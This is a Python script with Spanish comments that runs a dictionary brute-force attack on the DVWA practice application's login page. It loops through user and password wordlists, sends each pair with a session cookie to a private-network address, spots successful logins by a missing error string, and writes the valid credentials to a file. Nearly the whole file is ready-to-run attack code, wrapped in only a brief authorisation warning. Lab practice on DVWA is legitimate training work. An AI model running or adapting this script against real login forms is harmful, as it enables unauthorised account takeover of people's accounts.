#!/usr/bin/env python3
"""
Script de Ataque de Fuerza Bruta - DVWA Brute Force
Equivalente Python del comando Hydra proporcionado
"""

import requests
import sys
import time
from urllib.parse import urljoin

def load_wordlist(filepath):
    """Carga lista de palabras desde archivo"""
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Error: No se encontró el archivo {filepath}")
        sys.exit(1)

def brute_force_dvwa(target_url, users_file, passwords_file, cookie_session):
    """
    Ataque de fuerza bruta contra DVWA

    Args:
        target_url (str): URL objetivo (ej: http://192.168.100.79:4280/vulnerabilities/brute/)
        users_file (str): Archivo con usuarios
        passwords_file (str): Archivo con contraseñas
        cookie_session (str): Valor de PHPSESSID
    """

    # Cargar listas
    users = load_wordlist(users_file)
    passwords = load_wordlist(passwords_file)

    print(f"[+] Iniciando ataque de fuerza bruta")
    print(f"[+] Target: {target_url}")
    print(f"[+] Usuarios cargados: {len(users)}")
    print(f"[+] Contraseñas cargadas: {len(passwords)}")
    print(f"[+] Total combinaciones: {len(users) * len(passwords)}")
    print(f"[+] Cookie PHPSESSID: {cookie_session}")
    print("-" * 60)

    # Configurar cookies y headers
    cookies = {
        'PHPSESSID': cookie_session,
        'security': 'low'
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive'
    }

    session = requests.Session()
    session.headers.update(headers)
    session.cookies.update(cookies)

    successful_logins = []
    attempt_count = 0

    # Probar cada combinación
    for user in users:
        for password in passwords:
            attempt_count += 1

            # Parámetros GET según el formato de DVWA
            params = {
                'username': user,
                'password': password,
                'Login': 'Login'
            }

            try:
                print(f"[{attempt_count:04d}] {user}:{password}", end=" ... ")

                # Realizar petición GET (DVWA usa GET para brute force)
                response = session.get(target_url, params=params, timeout=10)

                # Verificar si el login fue exitoso
                # DVWA muestra "Username and/or password incorrect." cuando falla
                if "Username and/or password incorrect." not in response.text:
                    print("\033[92m¡ÉXITO!\033[0m")
                    successful_logins.append((user, password))
                    print(f"\033[92m[+] Credenciales válidas: {user}:{password}\033[0m")
                else:
                    print("\033[91mFalló\033[0m")

                # Pausa pequeña para evitar sobrecarga
                time.sleep(0.05)

            except requests.exceptions.RequestException as e:
                print(f"\033[93mError: {e}\033[0m")
                continue
            except KeyboardInterrupt:
                print("\n[!] Ataque interrumpido por el usuario")
                break

        # Salir si se interrumpe
        if 'KeyboardInterrupt' in str(sys.exc_info()[0]):
            break

    # Mostrar resultados finales
    print("\n" + "=" * 60)
    print("RESULTADOS DEL ATAQUE")
    print("=" * 60)
    print(f"Total intentos realizados: {attempt_count}")
    print(f"Credenciales exitosas encontradas: {len(successful_logins)}")

    if successful_logins:
        print("\n\033[92mCREDENCIALES VÁLIDAS:\033[0m")
        for user, password in successful_logins:
            print(f"  \033[92m✓ {user}:{password}\033[0m")

        # Guardar resultados en archivo
        with open('successful_logins.txt', 'w') as f:
            f.write("Credenciales válidas encontradas:\n")
            f.write(f"Target: {target_url}\n")
            f.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("-" * 40 + "\n")
            for user, password in successful_logins:
                f.write(f"{user}:{password}\n")

        print(f"\n[+] Resultados guardados en: successful_logins.txt")
    else:
        print("\n\033[91m[-] No se encontraron credenciales válidas\033[0m")

if __name__ == "__main__":
    print("=" * 60)
    print("    DVWA BRUTE FORCE ATTACK SCRIPT")
    print("=" * 60)

    # Configuración - MODIFICAR ESTOS VALORES
    TARGET_URL = "http://192.168.100.79:4280/vulnerabilities/brute/"
    USERS_FILE = "users.txt"                    # Ruta a archivo de usuarios
    PASSWORDS_FILE = "diccionario.txt"          # Ruta a archivo de contraseñas
    PHPSESSID = "64b47f00f4f9ff16a18e035f73181cb3"            # RELLENAR CON TU COOKIE

    print(f"Target URL: {TARGET_URL}")
    print(f"Users file: {USERS_FILE}")
    print(f"Passwords file: {PASSWORDS_FILE}")
    print(f"PHPSESSID: {'Configurado' if PHPSESSID != 'TU_PHPSESSID_AQUI' else 'NO CONFIGURADO - RELLENAR!'}")
    print()

    # Verificar que la cookie esté configurada
    if PHPSESSID == "TU_PHPSESSID_AQUI":
        print("\033[91m[ERROR] Debes configurar el valor PHPSESSID antes de ejecutar\033[0m")
        print("Modifica la variable PHPSESSID con el valor de tu cookie")
        sys.exit(1)

    # Verificar archivos
    import os
    if not os.path.exists(USERS_FILE):
        print(f"\033[91m[ERROR] No se encuentra el archivo: {USERS_FILE}\033[0m")
        sys.exit(1)

    if not os.path.exists(PASSWORDS_FILE):
        print(f"\033[91m[ERROR] No se encuentra el archivo: {PASSWORDS_FILE}\033[0m")
        sys.exit(1)

    # Confirmar ejecución
    print("\033[93m[WARNING] Este script realizará un ataque de fuerza bruta.\033[0m")
    print("\033[93mUsa solo en sistemas autorizados.\033[0m")
    confirm = input("¿Continuar? (y/N): ").lower().strip()

    if confirm == 'y':
        try:
            brute_force_dvwa(TARGET_URL, USERS_FILE, PASSWORDS_FILE, PHPSESSID)
        except KeyboardInterrupt:
            print("\n\033[91m[!] Ataque interrumpido\033[0m")
    else:
        print("Ataque cancelado.")
